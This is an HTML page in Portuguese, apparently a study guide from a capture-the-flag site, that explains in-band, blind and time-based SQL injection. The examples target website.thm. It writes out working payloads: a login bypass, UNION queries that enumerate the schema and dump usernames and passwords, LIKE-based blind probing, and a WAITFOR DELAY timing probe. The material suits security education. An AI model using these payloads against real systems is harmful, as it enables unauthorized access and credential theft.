<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL Injection - Guia Completo</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f0f8ff;
            color: #333;
            line-height: 1.6;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: linear-gradient(135deg, #115192 0%, #0a4b8f 100%);
            border-radius: 12px;
            color: white;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        
        h1 {
            font-size: 2.8rem;
            margin-bottom: 15px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
        }
        
        .subtitle {
            font-size: 1.2rem;
            opacity: 0.9;
        }
        
        h2 {
            color: #115192;
            margin: 35px 0 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #115192;
        }
        
        h3 {
            color: #0a4b8f;
            margin: 15px 0 10px;
        }
        
        p {
            margin-bottom: 15px;
        }
        
        .intro {
            background-color: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin-bottom: 40px;
            line-height: 1.8;
        }
        
        .cards-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        
        .card {
            background: linear-gradient(145deg, #ffffff, #f5f9ff);
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 25px;
            transition: all 0.3s ease;
            border-top: 5px solid #115192;
            position: relative;
            overflow: hidden;
        }
        
        .card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, #115192, #0a4b8f);
        }
        
        .card:hover {
            transform: translateY(-8px);
            box-shadow: 0 12px 20px rgba(0, 0, 0, 0.15);
        }
        
        .card-header {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .card-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #115192, #0a4b8f);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 1.5rem;
        }
        
        .card h3 {
            color: #115192;
            margin: 0;
            font-size: 1.4rem;
        }
        
        .card-content {
            color: #444;
            line-height: 1.6;
        }
        
        .highlight {
            background-color: #e8f4ff;
            padding: 12px 15px;
            border-radius: 8px;
            margin: 15px 0;
            border-left: 4px solid #115192;
            font-size: 0.95rem;
        }
        
        .highlight code {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: monospace;
        }
        
        .section {
            background: linear-gradient(to right, #e8f4ff, #f0f8ff);
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.08);
            margin: 40px 0;
            border-left: 5px solid #115192;
        }
        
        .code {
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 18px;
            border-radius: 8px;
            margin: 20px 0;
            overflow-x: auto;
            font-family: 'Fira Code', monospace;
            font-size: 0.95rem;
            line-height: 1.5;
            border-left: 4px solid #115192;
        }
        
        .example-link {
            display: inline-block;
            background: #115192;
            color: white;
            padding: 10px 20px;
            border-radius: 6px;
            text-decoration: none;
            margin: 10px 0;
            transition: background 0.3s;
        }
        
        .example-link:hover {
            background: #0a4b8f;
        }
        
        footer {
            text-align: center;
            margin-top: 50px;
            padding: 25px;
            color: #666;
            font-size: 0.95rem;
            border-top: 1px solid #ddd;
        }
        
        ul, ol {
            margin-left: 20px;
            margin-bottom: 15px;
        }
        
        li {
            margin-bottom: 8px;
        }
        
        @media (max-width: 768px) {
            .cards-container {
                grid-template-columns: 1fr;
            }
            
            header {
                padding: 20px;
            }
            
            h1 {
                font-size: 2.2rem;
            }
        }
    </style>
</head>
<body>
    <a href="../CTF.php"><?php include('../seta.php'); ?></a>
    <div class="container">
        <header>
            <h1>SQL INJECTION</h1>
            <p class="subtitle">Técnicas e exemplos de exploração de vulnerabilidades SQL</p>
        </header>
        
        <section class="intro">
            <h2>O que é SQL Injection?</h2>
            <p>SQL Injection é uma técnica de ataque que explora vulnerabilidades em aplicações que interagem com bancos de dados. Através da inserção de comandos SQL maliciosos em campos de entrada, um invasor pode manipular consultas SQL para acessar, modificar ou excluir dados não autorizados.</p>
        </section>
        
        <h2>Tipos de SQL Injection</h2>
        <div class="cards-container">
            <div class="card">
                <div class="card-header">
                    <div class="card-icon">
                        <i class="fas fa-broadcast-tower"></i>
                    </div>
                    <h3>In-Band SQL Injection</h3>
                </div>
                <div class="card-content">
                    <p>O atacante usa o mesmo canal para injetar o código SQL e receber os resultados. É o tipo mais comum e simples de explorar.</p>
                    <div class="highlight">
                        <strong>Exemplo:</strong> Ataques através de parâmetros URL como <code>https://website.thm/blog?id=1</code>
                    </div>
                </div>
            </div>
            
            <div class="card">
                <div class="card-header">
                    <div class="card-icon">
                        <i class="fas fa-low-vision"></i>
                    </div>
                    <h3>Blind SQL Injection</h3>
                </div>
                <div class="card-content">
                    <p>O atacante não recebe os resultados diretamente, mas pode inferir informações através do comportamento da aplicação.</p>
                    <div class="highlight">
                        <strong>Exemplo:</strong> Authentication Bypass com <code>' OR 1=1;--</code> em formulários de login
                    </div>
                </div>
            </div>
            
            <div class="card">
                <div class="card-header">
                    <div class="card-icon">
                        <i class="fas fa-clock"></i>
                    </div>
                    <h3>Time-Based SQL Injection</h3>
                </div>
                <div class="card-content">
                    <p>O atacante usa comandos que causam atrasos na resposta para inferir informações sobre a estrutura do banco de dados.</p>
                    <div class="highlight">
                        <strong>Exemplo:</strong> Usando <code>SLEEP()</code> ou <code>WAITFOR DELAY</code> para testes booleanos
                    </div>
                </div>
            </div>
        </div>
        
        <section class="section">
            <h2>In-Band SQL Injection</h2>
            
            <h3>Acessando Conteúdo Privado</h3>
            <p>Se uma URL termina especificando um ID como <code>https://website.thm/blog?id=1</code>, ela pode ser vulnerável a In-Band SQL Injection.</p>
            
            <p>Vamos supor que esse blog tenha páginas públicas e privadas, e não seja possível acessar pela URL mudando o ID caso seja privada. A consulta SQL seria algo como:</p>
            
            <div class="code">
                SELECT * from blog where id=2 and private=0 LIMIT 1;
            </div>
            
            <p>Para explorar essa vulnerabilidade podemos inserir <code>;--</code> na URL:</p>
            
            <div class="code">
                https://website.thm/blog?id=2;--
            </div>
            
            <p>Isso transforma a consulta em:</p>
            
            <div class="code">
                SELECT * from blog where id=2;-- and private=0 LIMIT 1;
            </div>
            
            <p>O SQL entende o ponto e vírgula como encerramento da requisição e o <code>--</code> como comentário, então a consulta efetiva passa a ser:</p>
            
            <div class="code">
                SELECT * from blog where id=2;--
            </div>
            
            <p>Então a página irá abrir mesmo sendo privada.</p>
            
            <h3>Descobrindo Informações do Banco de Dados</h3>
            <p>No exemplo de <code>https://website.thm/article?id=1</code>, para ver se é vulnerável, basta inserir um <code>'</code> e se retornar um erro SQL, está vulnerável.</p>
            
            <p>Para descobrir a quantidade de colunas podemos usar:</p>
            
            <div class="code">
                https://website.thm/article?id=1 UNION SELECT 1
            </div>
            
            <p>Continue tentando até não retornar erro:</p>
            <ul>
                <li><code>1 UNION SELECT 1</code></li>
                <li><code>1 UNION SELECT 1,2</code></li>
                <li><code>1 UNION SELECT 1,2,3</code></li>
                <li>etc.</li>
            </ul>
            
            <p>Quando retornar conteúdo, você encontrou a quantidade de colunas. Mude o ID para 0 para ver informações do banco:</p>
            
            <div class="code">
                0 UNION SELECT 1,2,database()
            </div>
            
            <p>Para ver as tabelas:</p>
            
            <div class="code">
                0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = "sql_one"
            </div>
            
            <p>Para ver a estrutura da tabela:</p>
            
            <div class="code">
                0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = "users"
            </div>
            
            <p>Para ver o conteúdo (ex: usuários e senhas):</p>
            
            <div class="code">
                0 UNION SELECT 1,2,group_concat(username, ':', password SEPARATOR '&lt;br&gt;') FROM users
            </div>
        </section>
        
        <section class="section">
            <h2>Blind SQL Injection</h2>
            
            <h3>Authentication Bypass</h3>
            <p>O Blind SQLi ocorre quando não recebemos feedback das injeções SQL na tela. O objetivo não é resgatar dados do banco, mas passar pelo login.</p>
            
            <p>Em usuário e senha você pode inserir:</p>
            
            <div class="code">
                ' OR 1=1;--
            </div>
            
            <p>Com isso a consulta verifica se a senha é nula ou se 1=1 (sempre verdadeiro). Se a vulnerabilidade existir, vai funcionar.</p>
            
            <h3>Boolean Based</h3>
            <p>Para verificar o número de colunas:</p>
            
            <div class="code">
                ' UNION SELECT 1,2,3;--
            </div>
            
            <p>Exemplo URL:</p>
            
            <div class="code">
                https://website.thm/checkuser?username=admin' UNION SELECT 1,2,3;--
            </div>
            
            <p>Para descobrir o nome do banco de dados (tentativa e erro para cada caractere):</p>
            
            <div class="code">
                admin123' UNION SELECT 1,2,3 where database() like 's%';--
            </div>
            
            <p>Continue testando: 'sa%', 'sb%', 'sc%'... até encontrar.</p>
            
            <p>Para descobrir tabelas:</p>
            
            <div class="code">
                admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sql_three' and table_name like 'a%';--
            </div>
            
            <p>Para descobrir colunas:</p>
            
            <div class="code">
                admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema='sql_three' and table_name='users' and column_name like 'a%';--
            </div>
            
            <p>Para descobrir usuários:</p>
            
            <div class="code">
                admin123' UNION SELECT 1,2,3 from users where username like 'a%'
            </div>
            
            <p>Para descobrir senhas:</p>
            
            <div class="code">
                admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%'
            </div>
            
            <h3>Time Based</h3>
            <p>SQL Injection baseado em tempo usa funções que causam atrasos para inferir informações:</p>
            
            <div class="code">
                admin123'; IF (SELECT COUNT(*) FROM users WHERE username = 'admin' AND SUBSTRING(password, 1, 1) = 'a') > 0 WAITFOR DELAY '0:0:5';--
            </div>
            
            <p>Se a resposta demorar 5 segundos, o primeiro caractere da senha é 'a'.</p>
        </section>
        
        <footer>
            <p>Material educativo para testes de penetração e segurança de aplicações web | SQL Injection</p>
        </footer>
    </div>
</body>
</html>